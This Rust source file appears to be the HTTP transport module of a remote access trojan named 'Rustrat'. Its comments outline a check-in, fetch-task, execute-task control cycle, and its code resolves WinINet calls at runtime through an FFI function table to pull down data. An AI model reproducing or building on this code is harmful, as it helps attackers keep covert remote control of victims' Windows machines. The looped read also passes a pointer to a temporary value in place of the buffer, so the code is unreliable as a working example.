// TODO: Initial state -> generate public key -> checkin -> regenerate public key if failed, otherwise continue -> fetch task -> execute task
// TODO wrappers, open HINTERNET handles when creating structs, calling InternetCloseHandle on destruction
// TODO remember error handling, functions may fail to connect

use crate::ffi::{error, FfiType, FnTable, Win32FfiTypes};

use libffi::middle::arg;
use std::ffi::CString;
use std::os::raw::c_void;
use std::ptr;

fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
    fn_table.register_fn(
        "InternetOpenA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetOpenUrlA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            FfiType::POINTER as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
            Win32FfiTypes::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetReadFile".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
            Win32FfiTypes::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetCloseHandle".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[FfiType::POINTER as i32],
    )?;

    Ok(())
}

pub unsafe fn do_http_get(url: String) -> error::Result<Vec<u8>> {
    let mut fn_table = FnTable::new();
    register_wininet_fns(&mut fn_table)?;

    let ua = CString::new("Rustrat").unwrap();
    let url = CString::new(url).unwrap();

    let internet_handle: *mut c_void = fn_table.call_fn(
        "InternetOpenA".to_string(),
        &[
            arg(&ua.as_ptr()),
            arg(&0u32), //INTERNET_OPEN_TYPE_PRECONFIG
            arg(&ptr::null::<c_void>()),
            arg(&ptr::null::<c_void>()),
            arg(&0u32), //No flags, synchronous request
        ],
    )?;

    let url_handle: *mut c_void = fn_table.call_fn(
        "InternetOpenUrlA".to_string(),
        &[
            arg(&internet_handle),
            arg(&url.as_ptr()),
            arg(&ptr::null::<c_void>()),
            arg(&-1i32),
            arg(&(
                0x4000000u32 // INTERNET_FLAG_DONT_CACHE
              | 0x80000u32 // INTERNET_FLAG_NO_COOKIES
              | 0x100u32 // INTERNET_FLAG_PRAGMA_NOCACHE
              | 0x80000000u32
                // INTERNET_FLAG_RELOAD
            )),
            arg(&ptr::null::<c_void>()),
        ],
    )?;

    let chunk_size = 0xffff;
    let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
    let mut total_bytes_written: u32 = 0;
    let mut bytes_written: u32 = 0;

    let mut is_error: i32 = fn_table.call_fn(
        "InternetReadFile".to_string(),
        &[
            arg(&url_handle),
            arg(&out.as_mut_ptr()),
            arg(&(out.capacity() as u32 - total_bytes_written)),
            arg(&(&mut bytes_written as *mut u32)),
        ],
    )?;

    while is_error != 0 && bytes_written != 0 {
        total_bytes_written += bytes_written;
        bytes_written = 0;

        out.set_len(total_bytes_written as usize);
        out.reserve(chunk_size);

        is_error = fn_table.call_fn(
            "InternetReadFile".to_string(),
            &[
                arg(&url_handle),
                arg(&(&out[total_bytes_written as usize..].as_mut_ptr())),
                arg(&(out.capacity() as u32 - total_bytes_written)),
                arg(&(&mut bytes_written as *mut u32)),
            ],
        )?;
    }

    if is_error == 0 {
        panic!("InternetReadFile returned an error!");
    }

    fn_table.call_fn("InternetCloseHandle".to_string(), &[arg(&url_handle)])?;

    fn_table.call_fn("InternetCloseHandle".to_string(), &[arg(&internet_handle)])?;

    Ok(out)
}
